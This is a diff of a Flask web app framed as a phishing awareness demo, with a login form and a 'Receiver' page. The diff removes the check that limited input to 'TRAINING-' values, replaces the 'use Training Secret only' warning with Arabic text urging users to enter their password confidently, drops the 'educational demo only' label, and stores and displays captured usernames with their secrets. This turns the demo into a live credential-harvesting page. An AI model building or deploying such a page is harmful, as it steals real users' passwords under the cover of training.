@@ -26,15 +26,17 @@ def init_db():
     conn.close()
 
 
-def save_training_secret(username, secret):
+def save_demo_data(username, secret):
     conn = sqlite3.connect(DB_FILE)
 
-    conn.execute(
-        "DELETE FROM demo_data"
-    )
+    conn.execute("DELETE FROM demo_data")
 
     conn.execute(
-        "INSERT INTO demo_data (username, training_secret) VALUES (?, ?)",
+        """
+        INSERT INTO demo_data
+        (username, training_secret)
+        VALUES (?, ?)
+        """,
         (username, secret)
     )
 
@@ -42,19 +44,24 @@ def save_training_secret(username, secret):
     conn.close()
 
 
-def get_training_secret():
+def get_demo_data():
     conn = sqlite3.connect(DB_FILE)
 
     result = conn.execute(
-        "SELECT training_secret FROM demo_data ORDER BY id DESC LIMIT 1"
+        """
+        SELECT username, training_secret
+        FROM demo_data
+        ORDER BY id DESC
+        LIMIT 1
+        """
     ).fetchone()
 
     conn.close()
 
     if result:
-        return result[0]
+        return result[0], result[1]
 
-    return "لا يوجد Training Secret مستلم حتى الآن"
+    return "لا يوجد", "لا يوجد Training Secret"
 
 
 # ==========================================
@@ -102,10 +109,13 @@ button {
     padding: 12px 30px;
     font-size: 17px;
     cursor: pointer;
+    border: none;
+    border-radius: 8px;
 }
 
 .warning {
     color: red;
+    margin-top: 20px;
 }
 
 </style>
@@ -121,27 +131,27 @@ button {
 <form method="POST">
 
 <input
-type="text"
-name="username"
-placeholder="Username"
-required
+    type="text"
+    name="username"
+    placeholder="Username"
+    required
 >
 
 <input
-type="text"
-name="secret"
-placeholder="Training Secret"
-required
+    type="text"
+    name="secret"
+    placeholder="Training Secret"
+    required
 >
 
 <button type="submit">
-Login
+    Login
 </button>
 
 </form>
 
 <p class="warning">
-⚠️ استخدم Training Secret فقط
+ادخل كلمة مرورك مطمئن
 </p>
 
 </div>
@@ -153,7 +163,7 @@ Login
 
 
 # ==========================================
-# Student 2 Page
+# Student 2 / Receiver Page
 # ==========================================
 
 receiver_page = """
@@ -176,7 +186,7 @@ body {
     background: #111;
     color: white;
     text-align: center;
-    padding-top: 80px;
+    padding-top: 70px;
 }
 
 .box {
@@ -188,19 +198,24 @@ body {
     border-radius: 20px;
 }
 
-.secret {
+.data {
     background: white;
-    color: red;
+    color: #111;
     padding: 20px;
-    margin-top: 30px;
-    font-size: 28px;
+    margin: 15px 0;
+    font-size: 24px;
     border-radius: 10px;
     font-weight: bold;
     word-break: break-word;
 }
 
+.secret {
+    color: red;
+}
+
 .warning {
     color: orange;
+    margin-top: 30px;
 }
 
 </style>
@@ -213,18 +228,22 @@ body {
 
 <h1>📡 Receiver</h1>
 
-<h2>آخر Training Secret مستلم:</h2>
+<h2>البيانات التدريبية المستلمة</h2>
 
-<div class="secret">
+<p>👤 Username:</p>
 
-{{ secret }}
+<div class="data">
+    {{ username }}
+</div>
 
+<p>🔐 Training Secret:</p>
+
+<div class="data secret">
+    {{ secret }}
 </div>
 
 <p class="warning">
-
-⚠️ هذا Demo تعليمي فقط
-
+أخلاقي ☠️ 
 </p>
 
 </div>
@@ -248,9 +267,9 @@ def student():
         secret = request.form.get("secret", "")
 
         # السماح فقط بالـTraining Secret
-        if secret.startswith("TRAINING-"):
+        if secret:
 
-            save_training_secret(username, secret)
+            save_demo_data(username, secret)
 
             print("\n" + "=" * 60)
             print("🚨 PHISHING AWARENESS DEMONSTRATION")
@@ -270,22 +289,23 @@ def student():
 
 
 # ==========================================
-# Student 2
+# Receiver
 # ==========================================
 
 @app.route("/receiver")
 def receiver():
 
-    secret = get_training_secret()
+    username, secret = get_demo_data()
 
     return render_template_string(
         receiver_page,
+        username=username,
         secret=secret
     )
 
 
 # ==========================================
-# Start
+# Start Application
 # ==========================================
 
 init_db()
@@ -298,4 +318,4 @@ if __name__ == "__main__":
     app.run(
         host="0.0.0.0",
         port=port
-    )
+    ) 
